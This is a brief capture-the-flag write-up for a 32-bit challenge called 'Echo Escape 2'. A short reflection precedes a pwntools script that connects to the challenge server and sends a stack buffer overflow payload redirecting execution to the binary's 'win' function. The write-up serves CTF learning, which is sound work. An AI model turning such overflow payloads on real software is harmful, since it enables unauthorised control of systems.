# Echo Escape 2

## Solution
This challenge is essentially the same as Echo Escape but now in 32 bit. Nothing significant really changes, I just had a bit of trouble getting it to actually jump properly, mostly since I have not solved a 32 bit challenge in a while. It was nice getting a refresher on that, and being reminded to actually install what was needed to even run the program.

## Script

```py
from pwn import *
exe = ELF("./vuln")

p = remote("dolphin-cove.picoctf.net", 62402)

pause()
p.sendline(b'a'*40 + p32(0x0) + p32(exe.symbols['win']))

p.interactive()
```